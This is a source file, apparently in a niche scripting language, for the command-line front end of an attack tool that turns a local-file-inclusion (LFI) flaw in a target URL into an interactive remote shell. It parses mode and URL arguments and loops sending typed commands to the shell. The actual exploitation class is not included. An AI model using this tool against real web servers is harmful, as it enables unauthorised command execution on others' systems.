import('sys');

class CliArgs {
    Mode: null,
};

class ArgMode {
    Class: 0,
    Option: 1,
    OptionValue: 2,
};

class ArgOption {
    Lfi: '-lfi',
    Url: '-u',
};

class ShellCommand {
    Quit: 'quit',
};

parseArgs = @{
    i = 0;
    key = null;
    mode = ArgMode.Class;
    obj = CliArgs();
    
    for (x in sys.argv @skip(1)) {
        switch (mode) {
            ArgMode.Class: {
                obj.Mode = x;
                mode = ArgMode.Option;
            }
            ArgMode.Option: {
                key = x;
                mode = ArgMode.OptionValue;
            }
            ArgMode.OptionValue: {
                switch (key) {
                    ArgOption.Url: obj.Url = x;
                }
                
                mode = ArgMode.Option;
            }
            default: {
                print('Error parsing argument: %s' % x);
                quit();
            }
        }
        
        i++;
    }
    
    ret obj;    
};

args = parseArgs();

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        if (cmd == ShellCommand.Quit) {
            print('Exiting');
            quit();
        }
        
        resp = shell.run(cmd);    
        print(resp);
    }
};

shell = null;

switch (args.Mode) {
    ArgOption.Lfi: {
        print('Exploiting LFI');
        next_url = @(seq) args.Url % seq;    
        shell = LfiShell(args.Url % '', next_url);    
        
        if (!shell.create()) {
            print('Failed to create shell, exiting');
            quit();
        }
    }
    
    default: {
        print('Invalid mode: %s' % args.Mode);
        quit();
    }
}

shellLoop(shell);